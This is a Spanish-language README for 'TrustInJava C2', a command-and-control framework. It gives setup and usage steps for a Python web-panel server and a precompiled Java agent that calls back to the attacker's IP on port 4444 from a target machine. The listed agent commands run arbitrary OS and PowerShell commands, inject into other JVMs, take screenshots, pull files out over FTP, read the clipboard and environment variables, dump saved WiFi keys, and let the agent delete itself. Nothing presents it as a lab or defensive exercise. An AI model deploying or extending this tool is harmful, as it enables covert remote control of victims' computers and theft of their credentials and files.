# TrustInJava C2
**Autor:** TR3XN3GR0
<p align="center">
  <img src="https://media.giphy.com/media/jleNxE9BsJVO8/giphy.gif" width="350">
</p>
---

## Requisitos

### Maquina del atacante (C2 Server)
| Requisito | Version minima | Descarga |
|-----------|---------------|----------|
| Python    | 3.8+          | https://www.python.org/downloads/ |
| Java JRE  | 11+           | https://adoptium.net/ |

### Maquina objetivo (donde corre el agente)
| Requisito | Version minima | Notas |
|-----------|---------------|-------|
| Java JRE  | 11+           | Solo necesita JRE, no JDK |

---

## Instalacion Rapida

### Windows (1 solo comando)
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\setup.ps1
```
El script te pedira la IP de tu maquina, instala las dependencias y crea el `config.ep` automaticamente.

### Linux / Mac (1 solo comando)
```bash
chmod +x setup.sh
./setup.sh
```

### Manual (si prefieres hacerlo paso a paso)
```bash
cd C2Server
pip install -r requirements.txt
```

---

## Uso

### Paso 1 - Iniciar el servidor C2

**Windows:**
```powershell
cd C2Server
.\start.ps1
```

**Linux/Mac:**
```bash
cd C2Server
python3 c2_server.py
```

Puertos que se abren:
- `4444` — Listener para agentes
- `5000` — Interfaz web (`http://localhost:5000`)
- `2121` — Servidor FTP (para screenshots y transferencia de archivos)

### Paso 2 - Preparar el agente

El agente ya viene compilado en `JavaAgent.jar.src/dist/RemoteAgent.jar`.

Copia estos 2 archivos al directorio donde quieres ejecutar el agente:
```
RemoteAgent.jar
config.ep          <-- crea este con la IP de tu C2
```

Formato del `config.ep` (2 lineas):
```
192.168.1.100
4444
```

> **Tip:** Desde el panel web, ve a la pestana **Agent Builder**, ingresa tu IP y descarga el `config.ep` ya configurado.

### Paso 3 - Ejecutar el agente

```bash
java -jar RemoteAgent.jar
```

El agente:
- Lee `config.ep` del directorio actual
- Se conecta al C2 automaticamente
- Aparece en el panel web en segundos
- Se auto-escala a modo Aggressive con la suite de comandos inicial

### Paso 4 - Panel de control

Abre `http://localhost:5000` en tu navegador.

Tabs disponibles:
- **Dashboard** — Agentes conectados, envio de comandos, resultados en tiempo real
- **Agent Builder** — Genera y descarga `config.ep`, descarga el JAR precompilado
- **Target Intel** — Perfil completo del objetivo (sistema, procesos, red, capturas)

---

## Comandos Disponibles

### Comandos de control (no requieren Aggressive)
| Comando | Descripcion |
|---------|-------------|
| `escalate` | Activa modo Aggressive (necesario para comandos avanzados) |
| `exit` | Termina la sesion del agente |
| `killagent` | Termina y auto-elimina el JAR del sistema |

### Comandos modo Aggressive
| Comando | Descripcion |
|---------|-------------|
| `systeminfo` | Info completa del sistema (OS, Java, usuarios) |
| `getuid` | Usuario actual |
| `currentpath` | Ruta donde se ejecuta el agente |
| `drives` | Unidades / particiones del sistema |
| `listproc` | Procesos en ejecucion (`tasklist /v /fo csv`) |
| `listJVMs` | Procesos Java activos (PID + nombre) |
| `currentJVM` | Info de la JVM actual del agente |
| `attachJVM <PID>` | Inyecta el agente en otra JVM del sistema |
| `screenshot` | Captura de pantalla completa (via FTP) |
| `download_file <ruta>` | Descarga un archivo del objetivo (via FTP) |
| `upload_file <nombre>` | Sube un archivo al objetivo (via FTP) |
| `clipboard` | Lee el contenido del portapapeles |
| `envvars` | Dump completo de variables de entorno |
| `netconn` | Conexiones de red activas (`netstat -ano`) |
| `arp` | Tabla ARP (hosts vecinos en la red) |
| `wifi_profiles` | Perfiles WiFi guardados + claves |
| `ps <comando>` | Ejecuta comando PowerShell (prefijo `ps`) |
| Cualquier otro texto | Ejecuta como comando del sistema operativo |

---

## Estructura del Proyecto

```
TrustInJava-C2/
├── setup.ps1                          <- Setup un click Windows
├── setup.sh                           <- Setup un click Linux/Mac
├── config.ep.example                  <- Formato de config del agente
├── README.md
│
├── C2Server/
│   ├── c2_server.py                   <- Servidor C2 (Flask + SocketIO)
│   ├── requirements.txt               <- Dependencias Python
│   ├── start.ps1                      <- Script inicio Windows
│   ├── templates/
│   │   └── index.html                 <- Panel web
│   └── ftp_files/
│       └── screenshots/               <- Capturas recibidas (ignoradas en git)
│
└── JavaAgent.jar.src/
    ├── src/main/java/com/trustinjava/agent/
    │   └── RemoteAgent.java           <- Codigo fuente del agente
    ├── pom.xml
    ├── build.ps1                      <- Compila el agente
    └── dist/
        └── RemoteAgent.jar            <- Agente precompilado (316 KB)
```

---

## Recompilar el Agente (opcional)

Solo necesario si modificas `RemoteAgent.java`.

Requisito adicional: **Java JDK 11+** (no solo JRE)

```powershell
cd JavaAgent.jar.src
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\build.ps1
```

---

## Troubleshooting

**Agente no aparece en el panel:**
- Verifica que `config.ep` existe y tiene el formato correcto (2 lineas: IP y puerto)
- Verifica que el C2 server esta corriendo y el puerto 4444 es accesible
- Revisa firewall: `netsh advfirewall firewall add rule name="C2" dir=in action=allow protocol=TCP localport=4444`

**Error al instalar dependencias:**
- Usa `pip install --user -r requirements.txt` si no tienes permisos de administrador
- En Linux: `pip3 install -r requirements.txt`

**Screenshot / File Transfer no funciona:**
- El puerto 2121 (FTP) debe estar accesible desde el agente
- Las credenciales son anonymous/anonymous

**`attachJVM` no funciona:**
- Requiere que tanto el agente como el proceso objetivo corran con el mismo usuario
- En Windows puede necesitar ejecutar el agente como Administrador

---

**TrustInJava C2 - TR3XN3GR0**

